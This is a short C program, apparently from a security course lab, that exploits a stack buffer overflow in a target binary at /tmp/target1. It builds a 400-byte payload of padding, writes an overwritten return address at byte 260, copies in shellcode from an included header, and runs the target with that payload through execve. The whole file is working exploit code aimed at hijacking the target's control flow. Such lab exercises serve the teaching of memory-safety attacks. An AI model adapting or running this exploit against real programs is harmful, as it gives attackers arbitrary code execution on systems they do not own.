#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

char payload[400];

void make_payload() {
  for (int i = 0; i < 400; i++) {
    payload[i] = 'A';
  }
  payload[260] = 0x34;
  payload[261] = 0xfd;
  payload[262] = 0xff;
  payload[263] = 0xbf;
  strncpy(payload+264, shellcode, 46);
  payload[399] = 0x00;
}

int main(void) {
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };
  make_payload();
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
